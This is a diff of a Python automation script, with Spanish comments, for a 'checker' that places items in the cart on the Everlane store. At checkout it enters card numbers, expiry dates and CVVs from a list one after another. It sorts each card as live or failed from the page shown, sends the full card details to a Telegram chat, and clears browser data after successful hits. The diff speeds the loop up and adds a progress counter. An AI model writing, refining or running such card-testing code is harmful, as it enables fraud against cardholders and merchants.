@@ -44,7 +44,7 @@ def preparar_worksplace():
         bot.locate('sock', check=True, click=False)
         bot.scroll(-250)
         bot.locate('talla_M', wait=0.5) or bot.locate('talla_L')
-        bot.locate('agregar_carrito', wait=0.5)
+        bot.locate('agregar_carrito', wait=0.1)
         bot.locate('your_cart', check=True, click=False)
         bot.locate('checkout')
 
@@ -91,29 +91,29 @@ def preparar_worksplace():
         bot.pause(0.20)
         bot.scroll(-500)
 
-def livear(cc_namso):
+def livear(cc_namso, current, total):
     print(f"Current: {cc_namso}")
     cc = separar_cc(cc_namso)
 
     if bot.locate('cc'):
-        bot.pause(0.3)
+        bot.pause(0.2)
         print(f'CC: {cc[0]}')
         bot.write(cc[0])
-        bot.pause(0.3)
+        bot.pause(0.2)
         bot.write(cc[1])
 
-        bot.pause(0.3)
+        bot.pause(0.2)
         print(f"MMYY: {cc[1]}/{cc[2][2:4]}")
         bot.write(cc[2][2:4])
 
-        bot.pause(0.3)
+        bot.pause(0.2)
         print(f"CVC: {cc[3]}")
         bot.write(cc[3])
 
-        bot.pause(0.3)
+        bot.pause(0.2)
         bot.locate('credit_card')
         bot.scroll(-500)
-        bot.pause(1.5)
+        bot.pause(1)
         bot.locate('review_order', check=True)
 
         bot.pause(0.5)
@@ -123,7 +123,7 @@ def livear(cc_namso):
 
         # Si encontramos el boton de editar o cerrar
         bot.locate('edit') or bot.locate('close')
-        bot.pause(1)
+        bot.pause(0.3)
 
         # Obtenemos la posicion de credit card (Boton Azul)
         # Para poder mover el raton de forma relativa sobre esa posicion
@@ -132,22 +132,22 @@ def livear(cc_namso):
         
         # Seleccionamos y escribimos la CC
         bot.move(credit_card[0]+100, credit_card[1]+66, click=True)
-        bot.pause(0.5)
+        bot.pause(0.3)
         bot.press_both('ctrl', 'a')
-        bot.pause(0.5)
+        bot.pause(0.3)
         print(f'CC: {cc[0]}')
         bot.copypaste(cc[0])
 
         # Seleccionamos y escribimos el MMYY
         if bot.locate('mmyy',wait=0.2):
-            bot.pause(1)
+            bot.pause(0.3)
         
         else:
             print('Corriendo ELSE MMYY')
             bot.move(credit_card[0]+293, credit_card[1]+66, click=True)
-            bot.pause(0.5)
+            bot.pause(0.3)
             bot.press_both('ctrl', 'a')
-            bot.pause(0.5)
+            bot.pause(0.3)
 
         print(f"MMYY: {cc[1]}/{cc[2][2:4]}")
         bot.copypaste(cc[1])
@@ -160,19 +160,19 @@ def livear(cc_namso):
         else:
             print('Corriendo ELSE CVC')
             bot.move(credit_card[0]+447, credit_card[1]+66, click=True)
-            bot.pause(0.5)
+            bot.pause(0.3)
             bot.press_both('ctrl', 'a')
-            bot.pause(0.5)
+            bot.pause(0.3)
 
         print(f"CVC: {cc[3]}")
         bot.copypaste(cc[3])
-        bot.pause(1)
+        bot.pause(0.3)
 
         # Hacemos click en credit card seguido de un scroll
         bot.press('enter')
         bot.pause(0.2)
         bot.press('end')
-        bot.pause(0.5)
+        bot.pause(0.3)
         
         if bot.locate('review_order'):
             pass
@@ -183,11 +183,12 @@ def livear(cc_namso):
 
     # Validamos si fue success o failed
 
-    bot.pause(5)
+    # Probablemente hay que hacer un bucle aqui
+    bot.pause(3)
 
     if bot.locate('thanks', click=False) or bot.locate('live', click=False) or bot.locate('survey', click=False):
         print(f'CC: {cc} - Live!')
-        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: LIVE! ✅\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}", '-726102881')
+        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: LIVE! ✅\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}", '-726102881')
         bot.press_both('ctrl', 'l')
         bot.copypaste('chrome://settings/clearBrowserData')
         bot.press('enter')
@@ -199,13 +200,13 @@ def livear(cc_namso):
 
     elif bot.locate('error1', click=False):
         print('There was a problem processing your card. Please call your card issuer or try a different card.')
-        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nThere was a problem processing your card. Please call your card issuer or try a different card.", '-726102881')
+        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nThere was a problem processing your card. Please call your card issuer or try a different card.", '-726102881')
     elif bot.locate('out_funds', click=False):
         print('Your card appears to be out of funds. Please try a new one.')
-        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nYour card appears to be out of funds. Please try a new one.", '-726102881')
+        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nYour card appears to be out of funds. Please try a new one.", '-726102881')
     elif bot.locate('unable_to_add', click=False):
         print("Unable to add payment method. Please try again.")
-        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nUnable to add payment method. Please try again.", '-726102881')
+        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nUnable to add payment method. Please try again.", '-726102881')
         
         bot.locate('urban_logo')
         bot.locate('urban_connected', check=True, click=False)
@@ -238,9 +239,13 @@ def main():
 
     cc_for_use = crear_lista(ccs)
 
+    total = len(cc_for_use)
+    current = 1
+
     for cc in cc_for_use:
         
-        livear(cc)
+        livear(cc, current, total)
+        current += 1
         
 if __name__ == '__main__':
 
